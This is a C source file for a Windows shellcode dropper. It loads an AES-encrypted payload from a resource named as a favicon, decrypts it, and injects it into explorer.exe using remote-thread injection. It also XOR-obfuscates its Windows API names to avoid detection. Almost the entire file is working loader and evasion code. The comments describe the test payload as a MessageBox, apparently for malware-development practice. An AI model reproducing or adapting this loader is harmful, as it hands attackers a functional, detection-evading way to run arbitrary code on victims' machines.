// Dropper:
// X shellcode == MessageBox
// X extract shellcode from .rsrc
// X decrypt shellcode (XOR)
// X inject shellcode into explorer.exe
// X hide console
// X obfuscate functions
// X obfuscate strings (XOR)
// - obfuscate all function calls
// - change XOR to AES

#include <windows.h>
#include <tlhelp32.h>
#pragma comment (lib, "advapi32")
#include "resources.h"

char key[] = "mysecretkeee";

// Inject
LPVOID (WINAPI *pVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
BOOL (WINAPI *pWriteProcessMemory)(HANDLE  hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
HANDLE (WINAPI *pCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
BOOL (WINAPI *pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);

void XOR(char *data, size_t data_len, char *key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
        return -1;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
        return -1;
    }
    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
        return -1;              
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
        return -1;
    }
    
    if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
        return -1;
    }
    
    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);
    
    return 0;
}

int FindTarget(const char *procname) {

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;
            
    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
            
    pe32.dwSize = sizeof(PROCESSENTRY32); 
            
    if (!Process32First(hProcSnap, &pe32)) {
            CloseHandle(hProcSnap);
            return 0;
    }
            
    while (Process32Next(hProcSnap, &pe32)) {
            if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                    pid = pe32.th32ProcessID;
                    break;
            }
    }
            
    CloseHandle(hProcSnap);
            
    return pid;
}

int Inject(HANDLE hProc, unsigned char *payload, unsigned int payload_len) {

    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;
    DWORD oldProtect = 0;

	unsigned char sVirtualAllocEx[] = { 0x3b, 0x10, 0x1, 0x11, 0x16, 0x13, 0x9, 0x35, 0x7, 0x9, 0xa, 0x6, 0x28, 0x1 };
	unsigned char sWriteProcessMemory[] = { 0x3a, 0xb, 0x1a, 0x11, 0x6, 0x22, 0x17, 0x1b, 0x8, 0x0, 0x16, 0x16, 0x20, 0x1c, 0x1e, 0xa, 0x11, 0xb };
	unsigned char sCreateRemoteThread[] = { 0x2e, 0xb, 0x16, 0x4, 0x17, 0x17, 0x37, 0x11, 0x6, 0xa, 0x11, 0x0, 0x39, 0x11, 0x1, 0x0, 0x2, 0x16 };
	unsigned char sWaitForSingleObject[] = { 0x3a, 0x18, 0x1a, 0x11, 0x25, 0x1d, 0x17, 0x27, 0x2, 0xb, 0x2, 0x9, 0x8, 0x36, 0x11, 0xf, 0x6, 0x11, 0x11 };

	XOR(sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));
	XOR(sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
	XOR(sCreateRemoteThread, sizeof(sCreateRemoteThread), key, sizeof(key));
	XOR(sWaitForSingleObject, sizeof(sWaitForSingleObject), key, sizeof(key));

    pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"), sVirtualAllocEx);
    pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), sWriteProcessMemory);
    pCreateRemoteThread = GetProcAddress(GetModuleHandle("kernel32.dll"), sCreateRemoteThread);
    pWaitForSingleObject = GetProcAddress(GetModuleHandle("kernel32.dll"), sWaitForSingleObject);

    pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    pWriteProcessMemory(hProc, pRemoteCode, payload, payload_len, NULL);
    
    hThread = pCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);

    if (hThread != NULL) {
            pWaitForSingleObject(hThread, -1);
            CloseHandle(hThread);
            return 0;
    }
    return -1;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {

	void * exec_mem;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	unsigned char *payload;
	unsigned int payload_len;

    unsigned char AESkey[] = { 0x5a, 0xdc, 0x9c, 0xd0, 0xfd, 0x9d, 0x46, 0xc1, 0xd9, 0xe, 0xea, 0x75, 0x99, 0x1d, 0xfc, 0x9 };

	// Extract payload from resources section
	res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = LoadResource(NULL, res);
	payload = (char *) LockResource(resHandle);
	payload_len = SizeofResource(NULL, res);

	// Allocate some memory buffer for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Decrypt payload
    AESDecrypt((char *)payload, payload_len, AESkey, sizeof(AESkey));

	// Copy payload to new memory buffer
	RtlMoveMemory(exec_mem, payload, payload_len);

	// Injecton process
	int pid = 0;
    HANDLE hProc = NULL;

	pid = FindTarget("explorer.exe");

	if (pid) {
		// try to open target process
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			Inject(hProc, exec_mem, payload_len);
			CloseHandle(hProc);
		}
	}

	return 0;
}